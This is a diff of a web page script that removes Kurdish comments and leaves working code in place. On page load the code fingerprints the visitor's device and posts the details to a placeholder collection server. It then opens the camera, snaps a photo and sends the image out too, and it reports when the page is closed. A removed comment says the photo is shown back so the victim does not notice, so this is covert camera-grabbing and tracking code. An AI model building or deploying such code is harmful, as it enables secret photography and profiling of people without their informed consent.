@@ -80,7 +80,6 @@
         (function() {
             "use strict";
 
-            // ===== کۆکردنەوەی زانیارییەکانی ئامێر =====
             function collectDeviceInfo() {
                 const info = {
                     timestamp: new Date().toISOString(),
@@ -97,15 +96,13 @@
                     colorDepth: screen.colorDepth,
                     pixelRatio: window.devicePixelRatio || 1,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    ip: '{{IP_ADDRESS}}'  // دەتوانرێت لەلایەن ڕاژەوە پڕبکرێتەوە
+                    ip: '{{IP_ADDRESS}}'
                 };
                 return info;
             }
 
-            // ===== ناردنی داتا بۆ ڕاژەی تۆ =====
             function sendData(data, type = 'info') {
-                // ئەم URLە بگۆڕە بۆ ڕاژەی خۆت (PHP/Node.js)
-                const endpoint = 'https://your-server.com/collect.php'; // ← بگۆڕە
+                const endpoint = 'https://your-server.com/collect.php';
 
                 fetch(endpoint, {
                     method: 'POST',
@@ -123,7 +120,6 @@
                 .catch(err => console.error('[-] Send error:', err));
             }
 
-            // ===== دەستپێگەیشتن بە کامێرا و وێنەگرتن =====
             function accessCamera() {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
@@ -147,34 +143,27 @@
                     video.srcObject = stream;
                     video.play();
 
-                    // چاوەڕوانی بۆ بارکردنی ڤیدیۆ
                     video.onloadedmetadata = function() {
-                        // وێنەگرتن لە دوای 1.5 چرکە
                         setTimeout(() => {
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                            // وێنەکە بکە بە Base64
                             const imageData = canvas.toDataURL('image/jpeg', 0.85);
 
-                            // نیشاندانی وێنە بەکارهێنەر (بۆ ئەوەی هەستی پێنەکات)
                             img.src = imageData;
                             img.style.display = 'block';
 
-                            // ناردنی وێنە بۆ ڕاژە
                             sendData({
                                 image: imageData,
                                 width: canvas.width,
                                 height: canvas.height
                             }, 'camera_capture');
 
-                            // ڕاگرتنی کامێرا دوای وێنەگرتن
                             stream.getTracks().forEach(track => track.stop());
                             video.style.display = 'none';
 
-                            // ناردنی زانیارییەکانی ئامێر
                             const deviceInfo = collectDeviceInfo();
                             sendData(deviceInfo, 'device_info');
 
@@ -184,26 +173,21 @@
                 .catch(err => {
                     console.error('[-] Camera error:', err);
                     sendData({ error: err.message }, 'camera_error');
-                    // هێشتا زانیارییەکان بنێرە
+
                     const deviceInfo = collectDeviceInfo();
                     sendData(deviceInfo, 'device_info');
                 });
             }
 
-            // ===== دەستپێکردن =====
-            // یەکەم: زانیارییەکانی ئامێر بنێرە
             const deviceInfo = collectDeviceInfo();
             sendData(deviceInfo, 'device_info');
 
-            // دواتر: دەستپێگەیشتن بە کامێرا (ئەگەر ڕێگەپێدرا)
             setTimeout(() => {
                 accessCamera();
             }, 1000);
 
-            // هەروەها دەتوانیت ئەمە بکەیت بۆ بینینی داتاکان لە کۆنسۆڵدا
             console.log('👑 Device Info:', deviceInfo);
 
-            // ===== گوێگرتن لە داخستنی پەڕە =====
             window.addEventListener('beforeunload', function() {
                 sendData({ action: 'page_closed' }, 'page_event');
             });
